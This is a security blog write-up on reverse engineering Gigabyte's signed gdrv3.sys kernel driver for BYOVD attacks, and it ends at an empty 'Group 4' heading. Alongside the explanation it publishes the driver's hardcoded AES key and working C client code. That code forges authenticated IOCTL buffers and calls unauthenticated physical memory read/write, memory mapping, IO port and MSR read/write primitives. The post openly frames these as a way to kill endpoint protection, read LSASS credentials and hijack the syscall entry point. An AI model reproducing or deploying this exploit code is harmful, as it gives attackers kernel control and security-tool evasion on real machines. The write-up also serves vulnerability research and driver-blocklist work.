# https://zonifer.dev/posts/byovd-kernel-driver-hardware-primitives.html

[← Back to Write-ups](https://zonifer.dev/)

# BYOVD: Reverse Engineering a Signed Kernel Driver with 13 Hardware Access Primitives

I recently reversed a legitimately signed Windows kernel driver and found 13 IOCTLs exposing a hardware access toolkit: arbitrary physical memory read/write, MSR read/write, kernel memcpy, raw IO port access, and more. Several of these have no authentication at all.

* * *

## Background: What Is BYOVD?

BYOVD (Bring Your Own Vulnerable Driver) is a post-exploitation technique used to obtain kernel-level access on a machine where you already have local admin. The common misconception is that local admin is enough to disable endpoint protection. In hardened enterprise environments, it is not.

Modern EDRs run core components as **Protected Process Light (PPL)**, a Windows security feature that prevents even SYSTEM-level callers from opening handles to protected processes through standard Win32 APIs. BYOVD works around this by loading a legitimately signed but vulnerable driver, moving the attack into the kernel where PPL enforcement does not apply.

Windows requires all kernel-mode drivers to carry a valid Microsoft-approved signature. This prevents an attacker from simply writing and loading a malicious driver. Instead, BYOVD abuses drivers that are already signed and trusted by the OS (legitimate software from hardware vendors, OEM utilities, and diagnostic tools) that happen to expose dangerous low-level access by design.

Once loaded, the attacker communicates with the driver via **IOCTL calls** to perform actions that are not possible from userland: terminating PPL-protected processes, removing kernel callbacks, or manipulating EDR agents directly in memory.

> **tl;dr:** You have admin on a machine but the AV won't let you disable it. Windows won't let you load your own kernel driver either. So instead you load someone else's legitimate but vulnerable driver (one Windows already trusts) and use it to reach the kernel and kill the AV from the inside.

* * *

## Kernel 101

### Protected Process Light (PPL)

PPL is a Windows security feature that restricts what a caller can do when interacting with a protected process. Even as local admin or SYSTEM, you cannot open a PPL-protected process with elevated permissions. The kernel will deny the request. Most enterprise EDRs run their core components as PPL for exactly this reason.

BYOVD bypasses this by operating from **kernel mode**, where PPL restrictions do not apply.

### Device Drivers and the I/O Manager

When you want to communicate with a kernel-mode driver you must go through the **I/O Manager**. It sits between userland and the kernel and handles all communication between the two.

Windows splits memory into two worlds: userland and the kernel. Your applications live in userland. Drivers live in the kernel. Code running in the kernel has direct access to hardware, memory, and every process on the system. Code running in userland does not. That separation is the foundation of Windows security.

To talk to a kernel driver from userland, Windows exposes a function called `DeviceIoControl`. You give it a handle to the driver's device object (opened with `CreateFile`, just like opening a file), an IOCTL code that tells the driver what operation you want, and an input buffer containing any parameters that operation needs. The I/O Manager sits between userland and the kernel and handles the handoff. It packages your request into an IRP (I/O Request Packet) and routes it to the correct driver. The driver receives the IRP, reads your input buffer, and acts on it.

The IOCTL code is just a number. It tells the driver which operation to run, the same way a function number tells a system call dispatcher which syscall to execute. The input buffer is raw bytes. The driver decides what those bytes mean and what to do with them.

If the driver does not validate who sent the request or what the input buffer contains, any process that can open the device handle can send arbitrary commands. **That is where the vulnerability lives.**

### IOCTL: The Attack Chain as an Analogy

You are the attacker. The EDR is a very important person locked inside a government building (a PPL-protected process). You cannot get to them directly. Security guards check your ID and turn you away even as a local admin.

But there is a **delivery driver** (the vulnerable kernel driver) who has a special government pass (a valid Microsoft signature) that lets him into the building without being stopped. He has been making deliveries for years and nobody questions him.

You find out this delivery driver accepts packages from anyone. He does not check who drops them off. He just looks at the label (IOCTL code) and delivers whatever is inside (your input buffer) to wherever the label says.

So you walk up (`DeviceIoControl`), hand him a package (your crafted input buffer) with a label saying "deliver this and do exactly what the note inside says." The driver takes it with no questions asked, walks past the security guards with his pass, and the recipient carries out the instructions.

The security guards never stopped him because he is trusted. The EDR never saw you coming because you never went through the front door.

**That is BYOVD end to end.**

* * *

## Methodology: How to Hunt for These Drivers

This is the part most posts skip. Here is the exact process to find your own.

### Step 1: Build a Target List

You want legitimately signed drivers that ship with consumer or enterprise software. Good sources:

- Hardware vendor utilities (GPU tools, motherboard apps, overclocking software)
- OEM diagnostic tools
- Anticheat and DRM drivers
- BIOS/firmware update utilities

Databases like [loldrivers.io](https://www.loldrivers.io/) catalog known-vulnerable drivers. Use it as a reference, but the goal here is to find something new.

### Step 2: Filter on Interesting Imports

Once you find a target, see if the driver drops any `.sys` files into `C:\Windows\System32\drivers`. Load the `.sys` file into Ghidra and check its import table.

To find the import table in Ghidra: open your `.sys` file and let auto-analysis finish. Then in the Symbol Tree panel on the left, expand the **Imports** folder. This lists every external function the driver calls, grouped by the DLL they come from. The kernel functions you care about live under `ntoskrnl.exe`. You can also go to **Window > Symbol Table**, filter by type "Function" and namespace "ntoskrnl.exe", and scan the list there.

These are some of the imports that signal dangerous capability:

| Import | Why it matters |
| --- | --- |
| `MmMapIoSpace` | Physical memory mapping |
| `ZwOpenProcess` | Process handle access |
| `ZwTerminateProcess` | Direct process kill |
| `MmGetPhysicalAddress` | VA to physical address translation |
| `RDMSR` / `WRMSR` | CPU MSR read/write |
| `MmAllocateContiguousMemory` | Physically contiguous allocation |
| `MmMapLockedPagesSpecifyCache` | MDL-based memory mapping |

If you see two or more of these together, the driver is worth reversing fully.

### Step 3: Find the IRP Dispatch Routine

Every kernel driver has an entry point called `DriverEntry`, the first function the OS calls when the driver loads. One of its jobs is to set up the driver's dispatch table, which is an array of function pointers that tells the I/O Manager which function to call for each type of request. The slot you care about is `IRP_MJ_DEVICE_CONTROL`, the handler for all IOCTL calls from userland.

To find it in Ghidra: after auto-analysis finishes, open the Symbol Tree and look for a function named `DriverEntry`. If Ghidra did not name it automatically, go to **Window > Symbol Table** and search for it there, or look for the entry point in the program header. Double-click it to open the decompiler view.

Inside `DriverEntry` you will see assignments to a struct. This is the `DRIVER_OBJECT`. Look for a line that assigns a function pointer to offset `0x70` in that struct. That offset corresponds to `MajorFunction[IRP_MJ_DEVICE_CONTROL]` and the function it points to is your target. Double-click through to it.

That function will typically look like a large switch statement on the IOCTL code value, with one case per supported operation.

### Step 4: Enumerate the IOCTL Handlers

Each case in the switch maps to a handler function. Double-click through to each one and open it in the decompiler. For each handler, you want to answer four questions:

**What is the IOCTL code?** It is the value in the switch case, usually a 32-bit hex constant like `0xC3502000`. Write it down.

**What input buffer size does it expect?** Look for an early size check near the top of the handler, something like `if (inputSize < 0x10) return error`. That tells you the minimum valid buffer size and gives you the field layout to reverse.

**Is there any authentication or validation?** Look for crypto calls, checksum calculations, or any logic that inspects the buffer before acting on it. If the handler calls kernel APIs immediately after the size check with no other validation, it is unauthenticated.

**Which kernel APIs does it call and with what arguments?** This is the payload. Trace where your input buffer fields end up. If `input[0..7]` gets passed as the first argument to `MmMapIoSpace`, you control a physical address. If it goes to `__wrmsr`, you control an MSR write. The dangerous imports you found in Step 2 will show up here.

Build a table as you go. By the time you have worked through every case in the switch, you have a complete map of the driver's attack surface. That is what the rest of this post does for `gdrv3.sys`.

* * *

## The Driver

Following the methodology above, I identified **Gigabyte APP Center** as a target. It ships a kernel driver called `gdrv3.sys` (MD5: `2791bbd810b9bc086bb1631e0f16c821`) and drops it into `C:\Windows\System32\drivers` on install.

Checking the import table in Ghidra immediately flagged it as worth reversing. The driver imports `MmMapIoSpace`, `MmGetPhysicalAddress`, `MmAllocateContiguousMemory`, `MmMapLockedPagesSpecifyCache`, and references to `RDMSR`/`WRMSR`. That is five dangerous imports from the Step 2 list in a single driver.

![Pasted image 20260427215944.png](https://zonifer.dev/posts/images/Pasted%20image%2020260427215944.png)

Because `gdrv3.sys` is a WDF driver, `DriverEntry` is a thin wrapper that hands off to the framework immediately. The dispatch function is not wired up in the normal place. Instead, searching memory in Ghidra for the known IOCTL constants lands directly inside the switch-case handler `0xC3502000` . It contains 13 IOCTL codes across four functional groups.

![Pasted image 20260427220509.png](https://zonifer.dev/posts/images/Pasted%20image%2020260427220509.png)

Working through each case with the Step 4 questions produced this table:

| IOCTL | Description | Auth |
| --- | --- | --- |
| `0xC3502000` | Read physical memory via `MmMapIoSpace` | **None** |
| `0xC3502004` | Map physical memory via MDL | AES+checksum |
| `0xC3502008` | Unmap MDL mapping | AES+checksum |
| `0xC350200C` | Map physical memory via `\Device\PhysicalMemory` | **None** |
| `0xC3502010` | Unmap `\Device\PhysicalMemory` mapping | **None** |
| `0xC3502014` | Write physical memory via `MmMapIoSpace` | **None** |
| `0xC3502400` | Read/Write IO ports (byte/word/dword) | AES+checksum |
| `0xC3502440` | IO port write with delay | AES+checksum |
| `0xC3502580` | Read/Write MSRs | AES+checksum |
| `0xC3502800` | Allocate contiguous physical memory | AES+checksum |
| `0xC3502804` | Free contiguous physical memory | AES+checksum |
| `0xC3502808` | Kernel memcpy (ring 0) | AES+checksum |
| `0xC350280C` | Virtual to physical address translation | AES+checksum |

Four IOCTLs in the `0x20xx` group require **no authentication whatsoever**. The rest use a shared AES+checksum scheme explained in the next section.

A walkthrough of how each IOCTL was reversed is explained in a later section.

* * *

## The Authentication Scheme: AES-128 CBC + Checksum

While working through the IOCTL handlers I noticed that most of them shared a common pattern before doing anything useful. Rather than acting on the input buffer immediately, they were running it through what looked like a decryption routine first. Reversing that routine revealed a full AES-128 CBC + checksum protection scheme sitting in front of nine of the thirteen IOCTLs.

The intended model is straightforward: only a trusted caller who knows the key can send valid commands. Here is what the crypto layer looks like in practice, taken from the IO port handler (`FUN_140008dac`, IOCTL `0xC3502400`):

```c
// Step 1: retrieve the input buffer and output buffer pointers
iVar4 = (*DAT_140005978)(DAT_140005d98, param_1, 0x24, &local_110);  // input: 0x24 bytes
iVar4 = (*DAT_140005980)(DAT_140005d98, param_1, 4,    &local_118);  // output: 4 bytes

// Step 2: checksum verification
// Sum all bytes 0..0x22, then check that ~sum == byte[0x23]
do {
    if (uVar6 < 0x23) {
        uVar7 = (ulonglong)((int)uVar7 + (uint)local_110[uVar6]);
    }
    uVar6 = uVar6 + 1;
} while ((longlong)uVar6 < 0x24);

if ((byte)~(byte)uVar7 == local_110[0x23]) {   // checksum must match or request is rejected

    // Step 3: AES-128 CBC decrypt the first 16 bytes of the input buffer
    FUN_140001490((longlong)local_108, 0x1400043d0, (undefined8 *)(local_110 + 0x10)); // key schedule
    FUN_140001400((longlong)local_108, local_110, 0x10);                               // CBC decrypt

    // Step 4: act on the decrypted plaintext
    // [0-1] width, [2-3] direction, [4-7] port, [8-11] value
    sVar1 = *(short *)local_110;   // width field
    if (sVar1 == 1) {
        if (*(short *)(local_110 + 2) == 0)
            out((short)*(undefined4 *)(local_110 + 4), local_110[8]);       // byte write
        else
            *(undefined1 *)local_118 = in((short)*(undefined4 *)(local_110 + 4)); // byte read
    }
    // ... same pattern for word (2) and dword (4) widths
}
```

This same three-step pattern (size check, checksum verify, AES decrypt, then act) appears in every authenticated handler. Once you have reversed it once, you have reversed them all.

Reversing the crypto helper functions confirmed standard AES-128 with no modifications:

- `FUN_140001854`: AES-128 key schedule
- `FUN_140001504`: AES round function (ShiftRows + SubBytes, standard S-box)
- `FUN_140001400`: AES-128 CBC mode decryption, IV taken from `input[16..31]`

Here is `FUN_140001490`, the setup function called first. It runs the key schedule and loads the IV from the input buffer into the crypto context:
For this to provide real security, the key needs to be secret. The problem: **the key is hardcoded in the driver binary.**

```c
void FUN_140001490(longlong param_1, longlong param_2, undefined8 *param_3)
{
    // param_1 = crypto context (stack buffer local_108 from the caller)
    // param_2 = pointer to hardcoded key (0x1400043d0 in the binary)
    // param_3 = pointer to input[0x10..0x1f] — the raw key bytes placed there by the caller
    //           this is also the IV for CBC mode

    FUN_140001854(param_1, param_2);          // build key schedule into context

    // store IV (bytes 16..31 of input buffer) into context at offset 0xb0
    *(undefined8 *)(param_1 + 0xb0) = *param_3;
    *(undefined8 *)(param_1 + 0xb8) = param_3[1];
}
```

And `FUN_140001400`, the actual CBC decryption loop. It processes the input in 16-byte blocks, running the AES round function and then XORing with the previous ciphertext to implement CBC chaining:

```c
void FUN_140001400(longlong param_1, byte *param_2, uint param_3)
{
    // param_1 = crypto context (holds key schedule and IV)
    // param_2 = pointer to input buffer bytes 0..15 (the ciphertext to decrypt)
    // param_3 = length in bytes

    lVar5 = (param_1 - (longlong)param_2) + 0xb0;  // offset to IV stored in context
    lVar4 = ((ulonglong)param_3 - 1 >> 4) + 1;      // number of 16-byte blocks

    do {
        // save current ciphertext block (becomes next IV after decryption)
        uVar1 = *(undefined8 *)param_2;
        uVar2 = *(undefined8 *)(param_2 + 8);

        FUN_140001504(param_2, param_1);   // AES round function: decrypt block in place

        // CBC: XOR decrypted block with previous ciphertext (IV for first block)
        lVar3 = 0x10;
        do {
            *param_2 = *param_2 ^ param_2[lVar5];  // XOR each byte with IV
            param_2 = param_2 + 1;
            lVar3 = lVar3 + -1;
        } while (lVar3 != 0);

        lVar5 = lVar5 + -0x10;

        // update IV in context to current ciphertext block for next iteration
        *(undefined8 *)(param_1 + 0xb0) = uVar1;
        *(undefined8 *)(param_1 + 0xb8) = uVar2;

        lVar4 = lVar4 + -1;
    } while (lVar4 != 0);
}
```

After these two functions return, `input[0..15]` contains the decrypted plaintext and the handler reads the field values directly out of it.

So to summarize what we have found so far: most IOCTLs in this driver will not act on your input buffer until it passes a checksum check and an AES-128 CBC decryption step. This means that as the caller, you are responsible for encrypting your plaintext parameters before sending them. You encrypt your payload, append the raw key bytes at `input[16..31]`, and compute the checksum over the whole buffer. The driver receives that encrypted buffer, decrypts it, and only then reads your field values. If you send a raw unencrypted buffer the checksum will not match and the driver rejects the request immediately. This is the mechanism Gigabyte intended to keep untrusted callers out. Without knowing the AES key you cannot encrypt a valid request and you cannot get past this check.

Now that we understand the scheme, the obvious question is: can we find the key?

The answer is yes, and it took about thirty seconds to find. Running a string search on the binary in Ghidra ( **Search > For Strings**) surfaces it immediately:

![Pasted image 20260427222358.png](https://zonifer.dev/posts/images/Pasted%20image%2020260427222358.png)

Clicking on the location it shows several `XREF` indicating that this is the password used.
![Pasted image 20260427222434.png](https://zonifer.dev/posts/images/Pasted%20image%2020260427222434.png)

It is sitting in the binary as a plain string literal. No obfuscation, no derivation, no per-install randomization. Every copy of this driver on every machine in the world has the same key baked into it. Once one person finds it, every installation is compromised. This turns the entire AES scheme from an access control mechanism into a speed bump for anyone who has not looked at the binary yet.

Here is the exploit code that builds a valid protected buffer. This function is the foundation for every authenticated IOCTL call in the client:

```c
// AesEncryptBlock: encrypts 16 bytes in-place using CryptoAPI
// CBC mode: caller XORs plaintext with IV before calling
BOOL AesEncryptBlock(BYTE* data, const BYTE* key, const BYTE* iv)
{
    HCRYPTPROV hProv = 0;
    HCRYPTKEY  hKey  = 0;
    BOOL       ok    = FALSE;

    BYTE tmp[32] = { 0 };
    for (int i = 0; i < 16; i++)
        tmp[i] = data[i] ^ iv[i];   // CBC: XOR plaintext with IV first

    struct {
        BLOBHEADER hdr;
        DWORD      keyLen;
        BYTE       keyData[16];
    } keyBlob = {
        { PLAINTEXTKEYBLOB, CUR_BLOB_VERSION, 0, CALG_AES_128 },
        16
    };
    memcpy(keyBlob.keyData, key, 16);

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
        return FALSE;
    if (!CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey))
        goto cleanup;

    DWORD dataLen = 16;
    // NOTE: 32-byte buffer is intentional. CryptEncrypt needs room for PKCS7 padding.
    // Passing only 16 bytes causes ERROR_MORE_DATA (234).
    ok = CryptEncrypt(hKey, 0, TRUE, 0, tmp, &dataLen, 32);
    if (ok) memcpy(data, tmp, 16);

cleanup:
    if (hKey)  CryptDestroyKey(hKey);
    if (hProv) CryptReleaseContext(hProv, 0);
    return ok;
}

// BuildAesBuffer: wraps AesEncryptBlock into the full 0x24 byte format the driver expects
BOOL BuildAesBuffer(BYTE* inBuf, DWORD inBufSize, BYTE* plaintext, DWORD plaintextSize)
{
    static const BYTE key[16] = "GIGABYTEPASSWORD";
    memset(inBuf, 0, inBufSize);
    memcpy(inBuf, plaintext, plaintextSize);    // payload in bytes 0-15
    if (!AesEncryptBlock(inBuf, key, key))      // encrypt in place, IV = key
        return FALSE;
    memcpy(inBuf + 0x10, key, 16);             // raw key in bytes 16-31
    BYTE sum = 0;
    for (DWORD i = 0; i < inBufSize - 1; i++)
        sum += inBuf[i];
    inBuf[inBufSize - 1] = ~sum;               // checksum in last byte
    return TRUE;
}
```

Every authenticated IOCTL call in the rest of this post uses `BuildAesBuffer` or a manual variant of it for multi-block payloads.

* * *

## Opening the Device

Before any IOCTL can be sent, you need a handle to the driver's device object. This is the entire access barrier:

```c
HANDLE hDev = CreateFileA(
    "\\\\.\\GIOV3",          // device symlink registered by the driver
    GENERIC_READ | GENERIC_WRITE,
    0, NULL, OPEN_EXISTING, 0, NULL
);
```

If the device DACL permits Administrator access (the default for most drivers), this succeeds immediately with no interaction with any security product. No kernel exploit required. The driver voluntarily opens a handle to any sufficiently privileged caller. From this point, every primitive below is available.

* * *

## IOCTL Walkthrough

At this point we have done a lot of groundwork. We found the driver, enumerated the import table, located the dispatch function, identified the protection scheme, reversed the AES-128 CBC encryption, and extracted the hardcoded key from the binary. We have a complete list of 13 IOCTL codes and we know which ones are authenticated and which are not.

Now it is time to go through each handler and figure out what it actually does. For each one the structure is the same: the Ghidra decompilation shows what the driver does with your input, and the exploit code shows how to build that input and call it.

* * *

### Group 1: Physical Memory Access

#### `0xC3502000`: Read Physical Memory via `MmMapIoSpace`

**Auth: None**

**Ghidra decompilation:**

```c
int FUN_140008c14(undefined8 param_1, undefined8 param_2, ulonglong param_3, undefined8 *param_4)
{
    undefined8 *puVar2;
    undefined8 *local_18 [2];

    // param_3 is input buffer size, must be at least 0x10
    if (param_3 < 0x10) { /* log error */ return error; }

    puVar2 = (undefined8 *)MmMapIoSpace(*local_18[0],              // physical address from input[0..7]
                                         *(undefined4 *)(local_18[0] + 1),  // byte count from input[8..11]
                                         0);                       // MmNonCached
    if (puVar2 != NULL) {
        FUN_140002b80(                                              // copies mapped memory TO destination
            (undefined8 *)(longlong)*(int *)((longlong)local_18[0] + 0xc), // dest VA from input[12..15]
            puVar2,
            (ulonglong)*(uint *)(local_18[0] + 1));                // byte count
        MmUnmapIoSpace(puVar2, *(undefined4 *)(local_18[0] + 1));  // cleanup
    }
}
```

The driver reads three values from your raw 16-byte input buffer: the physical address to read from, how many bytes to read, and where to write the result. It maps the physical address into kernel VA space with `MmMapIoSpace`, copies the bytes to your destination, then unmaps. No authentication, no bounds checking.

**Input buffer layout (16 bytes):**

| Bytes | Content |
| --- | --- |
| 0–7 | Physical address to read from |
| 8–11 | Number of bytes to read |
| 12–15 | Destination virtual address (lower 32 bits) |

**Exploit code:**

```c
void DoReadPhysMem(HANDLE hDev)
{
    LONGLONG physAddr;
    DWORD    size;
    LONGLONG destVirt;
    printf("Physical address (hex): 0x"); scanf_s("%llx", &physAddr);
    printf("Size (hex): 0x");             scanf_s("%lx",  &size);
    printf("Dest virtual address: 0x");   scanf_s("%llx", &destVirt);

    BYTE inBuf[0x10] = { 0 };
    memcpy(inBuf,      &physAddr, 8);   // [0..7]  physical address
    memcpy(inBuf + 8,  &size,     4);   // [8..11] byte count
    memcpy(inBuf + 12, &destVirt, 4);   // [12..15] dest VA (NOTE: truncated to 32-bit)

    // No encryption, no checksum. Just raw values straight to the driver.
    BYTE outBuf[0x10] = { 0 };
    DWORD bytesReturned = 0;
    DeviceIoControl(hDev, 0xC3502000, inBuf, 0x10, outBuf, 0x10, &bytesReturned, NULL);
}
```

> **Note:** Notice there is no `BuildAesBuffer` call here. The buffer is just raw bytes. `memcpy` places each field at the exact offset the driver expects. The driver reads `input[0..7]` as a 64-bit physical address and acts on it immediately.

**Impact:** Any process that can open the device handle gets arbitrary physical memory read. Physical addresses are not randomised. An attacker can read any process's memory, kernel data structures, or hardware-mapped regions without ever touching the target process through OS APIs. Reading LSASS memory for credentials requires no `OpenProcess`, no handle, no EDR hook. Just a physical address.

* * *

#### `0xC3502014`: Write Physical Memory via `MmMapIoSpace`

**Auth: None**

**Ghidra decompilation:**

```c
int FUN_140002198(...)
{
    // input buffer is 0x18 (24 bytes)
    puVar2 = (undefined8 *)MmMapIoSpace(*local_18[0],                      // physical address [0..7]
                                         *(undefined4 *)(local_18[0] + 1),  // byte count [8..11]
                                         0);
    if (puVar2 != NULL) {
        // NOTE: argument order reversed vs 0xC3502000, dest and src are swapped
        FUN_140002b80((undefined8 *)local_18[0][2],                         // src: data to write [16..23]
                      puVar2,                                               // dest: mapped physical memory
                      (ulonglong)*(uint *)(local_18[0] + 1));               // byte count
        MmUnmapIoSpace(puVar2, *(undefined4 *)(local_18[0] + 1));
    }
}
```

Same pattern as the read, but the argument order to the internal copy function is reversed. Source and destination swap. The driver writes your data into physical memory instead of reading out of it.

**Input buffer layout (24 bytes):**

| Bytes | Content |
| --- | --- |
| 0–7 | Target physical address |
| 8–11 | Number of bytes to write |
| 12–15 | Padding |
| 16–23 | Data to write |

**Exploit code:**

```c
void DoWritePhysMem(HANDLE hDev)
{
    LONGLONG physAddr, srcVirt;
    DWORD    size;
    printf("Physical address (hex): 0x"); scanf_s("%llx", &physAddr);
    printf("Size (hex): 0x");             scanf_s("%lx",  &size);
    printf("Source virtual address: 0x"); scanf_s("%llx", &srcVirt);

    BYTE inBuf[0x18] = { 0 };
    memcpy(inBuf,      &physAddr, 8);   // [0..7]  target physical address
    memcpy(inBuf + 8,  &size,     4);   // [8..11] byte count
    memcpy(inBuf + 16, &srcVirt,  8);   // [16..23] data to write

    BYTE outBuf[0x10] = { 0 };
    DWORD bytesReturned = 0;
    DeviceIoControl(hDev, 0xC3502014, inBuf, 0x18, outBuf, 0x10, &bytesReturned, NULL);
}
```

**Impact:** Combined with `0xC3502000`, this is a complete arbitrary physical memory read/write primitive with zero authentication. An attacker can overwrite kernel data structures, patch running kernel code, or modify any process's memory. All without touching OS APIs.

* * *

#### `0xC350200C`: Map Physical Memory via `\Device\PhysicalMemory`

**Auth: None**

**Ghidra decompilation:**

```c
int FUN_140001fb8(...)
{
    // Opens the kernel's PhysicalMemory section object and maps it into user-mode
    RtlInitUnicodeString(local_18, L"\\Device\\PhysicalMemory");
    ZwOpenSection(&local_78, 0xf001f, &local_50);
    ObReferenceObjectByHandle(local_78, 0xf001f, 0, 0, local_20, 0);

    local_68 = *(undefined8 *)local_70;       // physical address from input
    local_60 = (ulonglong)(uint)local_70[2];  // size from input

    ZwMapViewOfSection(local_78, 0xffffffffffffffff,  // -1 = current process
                       &local_res18, 0, local_60, &local_68, &local_60,
                       1, 0, 4);                      // ViewShare, PAGE_READWRITE

    // Adjust returned VA by in-page offset and return it to the caller
    local_res18 = local_res18 + (ulonglong)(uint)(*local_70 - (int)local_68);
    *local_58 = local_res18;   // user-mode VA returned in output buffer
}
```

Instead of a one-shot copy, this gives the caller a **persistent mapping** into physical memory that lives until they unmap it. The driver opens `\Device\PhysicalMemory` (the kernel section object that represents all physical RAM) and maps a caller-specified range directly into the calling process's user-mode address space. Zero authentication.

**Exploit code:**

```c
void DoMapPhysicalMemory(HANDLE hDev)
{
    LONGLONG physAddr;
    DWORD    size, offset;
    printf("Physical address (hex): 0x"); scanf_s("%llx", &physAddr);
    printf("Size (hex): 0x");             scanf_s("%lx",  &size);
    printf("In-page offset (hex): 0x");   scanf_s("%lx",  &offset);

    BYTE inBuf[0x10] = { 0 };
    memcpy(inBuf,      &physAddr, 8);
    memcpy(inBuf + 8,  &size,     4);
    memcpy(inBuf + 12, &offset,   4);

    BYTE outBuf[0x10] = { 0 };
    DWORD bytesReturned = 0;
    if (DeviceIoControl(hDev, 0xC350200C, inBuf, 0x10, outBuf, 0x10, &bytesReturned, NULL)) {
        PVOID virtAddr = 0;
        memcpy(&virtAddr, outBuf, sizeof(PVOID));
        printf("Mapped virtual address: %p\n", virtAddr);  // you can now read/write this pointer directly
    }
}
```

> **Beginner note:** After this call succeeds, `virtAddr` is a normal pointer in your process that reads and writes directly to physical memory. You can dereference it like any other pointer. For example, `*(DWORD*)virtAddr = 0x41414141` writes to physical RAM with no further IOCTL calls needed.

**Impact:** The same physical memory access as `0xC3502000/14`, but as a persistent mapping rather than per-call. Useful for iterating over a memory region without sending a new IOCTL for every read. The existence of two independent unauthenticated physical memory access paths suggests this attack surface was never considered during development.

* * *

### Group 2: IO Port Access

#### `0xC3502400`: Read/Write IO Ports

**Auth: AES+checksum**

**Ghidra decompilation (annotated):**

```c
// FUN_140008dac
// After AES decrypt, the 16-byte plaintext layout is:
//   [0-1]  width: 1=byte, 2=word, 4=dword
//   [2-3]  direction: 0=write, 1=read
//   [4-7]  port number
//   [8-11] value to write (if direction == 0)
// Dispatches on width, then executes x86 IN or OUT instruction directly
// Read result returned in 4-byte output buffer
```

The driver executes raw x86 `IN`/`OUT` port instructions on your behalf. You tell it the port number, access width (byte/word/dword), and direction (read/write). It does the rest.

**Exploit code:**

```c
void DoIoPort(HANDLE hDev)
{
    SHORT width, direction;
    DWORD port, value = 0;
    printf("Width (1=byte, 2=word, 4=dword): "); scanf_s("%hd", &width);
    printf("Direction (0=write, 1=read): ");      scanf_s("%hd", &direction);
    printf("Port (hex): 0x");                     scanf_s("%lx", &port);
    if (direction == 0) {
        printf("Value to write (hex): 0x");       scanf_s("%lx", &value);
    }

    // Pack all fields into a 16-byte plaintext at the offsets Ghidra showed us
    BYTE plaintext[16] = { 0 };
    memcpy(plaintext,     &width,     2);   // [0-1] width
    memcpy(plaintext + 2, &direction, 2);   // [2-3] direction
    memcpy(plaintext + 4, &port,      4);   // [4-7] port number
    memcpy(plaintext + 8, &value,     4);   // [8-11] write value

    // BuildAesBuffer encrypts this plaintext and wraps it in the 0x24 byte format
    BYTE inBuf[0x24] = { 0 };
    BYTE outBuf[4]   = { 0 };
    BuildAesBuffer(inBuf, 0x24, plaintext, 16);

    DWORD bytesReturned = 0;
    if (DeviceIoControl(hDev, 0xC3502400, inBuf, 0x24, outBuf, 4, &bytesReturned, NULL)) {
        if (direction == 1)
            printf("Port read value: 0x%08X\n", *(DWORD*)outBuf);
        else
            printf("Port write completed\n");
    }
}
```

> **Note:** This is the pattern for every authenticated IOCTL. You figure out the plaintext field layout from Ghidra, pack your values into a 16-byte buffer at the right offsets, call `BuildAesBuffer` to encrypt and checksum it, then `DeviceIoControl`. The driver decrypts, reads your fields, and acts.

**Impact:** Notable IO port targets include `0x70`/`0x71` (CMOS/RTC), `0x60`/`0x64` (keyboard/mouse controller), and `0xCF8`/`0xCFC` (PCI configuration space). Writing to PCI config space can reconfigure hardware devices at a level the OS cannot see or recover from without a reboot.

* * *

### Group 3: MSR Access

#### `0xC3502580`: Read/Write Machine Specific Registers

**Auth: AES+checksum**

**Ghidra decompilation (annotated):**

```c
// FUN_140002330
// Input: 0x34 bytes (32 bytes plaintext across two encrypted blocks + key + checksum)
// Decrypted 32-byte plaintext layout:
//   [0-7]   operation: 0=write, 1=read
//   [8-15]  MSR number
//   [16-23] value low qword (for write) / returned low (for read)
//   [24-31] value high qword (for write) / returned high (for read)
//
// Driver explicitly handles MSRs:
//   0x174, 0x175, 0x176: SYSENTER_CS, SYSENTER_ESP, SYSENTER_EIP
//   0xC0000081: LSTAR (64-bit syscall entry point)

if (op == 0) {
    __wrmsr(msrNum, valueLow, valueHigh);   // write
} else {
    value = __rdmsr(msrNum);               // read
}
```

This IOCTL executes `RDMSR` or `WRMSR` directly. The input is 32 bytes of plaintext, which is too large for a single AES block, so the payload spans two blocks that must be encrypted separately.

**Exploit code:**

```c
void DoMsr(HANDLE hDev)
{
    LONGLONG op, msrNum, low = 0, high = 0;
    printf("Operation (0=write, 1=read): "); scanf_s("%lld", &op);
    printf("MSR number (hex): 0x");          scanf_s("%llx", &msrNum);
    if (op == 0) {
        printf("Value low (hex): 0x");       scanf_s("%llx", &low);
        printf("Value high (hex): 0x");      scanf_s("%llx", &high);
    }

    static const BYTE key[16] = "GIGABYTEPASSWORD";

    // Build the 32-byte plaintext across two 16-byte blocks
    BYTE plaintext[32] = { 0 };
    memcpy(plaintext,      &op,     8);   // [0-7]   operation
    memcpy(plaintext + 8,  &msrNum, 8);   // [8-15]  MSR number
    memcpy(plaintext + 16, &low,    8);   // [16-23] value low
    memcpy(plaintext + 24, &high,   8);   // [24-31] value high

    // 0x34 buffer: 32 bytes encrypted plaintext + 16 bytes key + 1 byte checksum
    BYTE inBuf[0x34] = { 0 };
    memcpy(inBuf,      plaintext,      16);  // copy block 1
    AesEncryptBlock(inBuf,      key, key);   // encrypt block 1
    memcpy(inBuf + 16, plaintext + 16, 16);  // copy block 2
    AesEncryptBlock(inBuf + 16, key, key);   // encrypt block 2 (same IV, see notes)

    memcpy(inBuf + 0x20, key, 16);   // key material at [0x20..0x2F]
    BYTE sum = 0;
    for (int i = 0; i < 0x33; i++) sum += inBuf[i];
    inBuf[0x33] = ~sum;              // checksum at [0x33]

    BYTE outBuf[0x20] = { 0 };
    DWORD bytesReturned = 0;
    if (DeviceIoControl(hDev, 0xC3502580, inBuf, 0x34, outBuf, 0x20, &bytesReturned, NULL)) {
        if (op == 1) {
            LONGLONG retLow, retHigh;
            memcpy(&retLow,  outBuf + 16, 8);
            memcpy(&retHigh, outBuf + 24, 8);
            printf("MSR 0x%llX = High: 0x%016llX  Low: 0x%016llX\n", msrNum, retHigh, retLow);
        }
    }
}
```

> **Note:** When a plaintext payload is larger than 16 bytes, `BuildAesBuffer` cannot be used because it only handles single-block payloads. For multi-block inputs, encrypt each 16-byte chunk with `AesEncryptBlock` separately, then append the key and checksum manually. The field offsets still come from Ghidra. Just pack them into the right positions in `plaintext[]`.

**Verified output from testing:**

```
MSR 0x1A0 = High: 0x0000000000000000  Low: 0x0000000000850889
```

**Impact:** This is the most dangerous single primitive in the driver. Writing to **LSTAR** (`0xC0000081`) redirects every `syscall` instruction on the system to attacker-controlled code, achieving a complete kernel takeover in a single `DeviceIoControl` call. Writing to the **SYSENTER MSRs** (`0x174` through `0x176`) achieves the same on 32-bit paths.

* * *

### Group 4: Memory Primitives

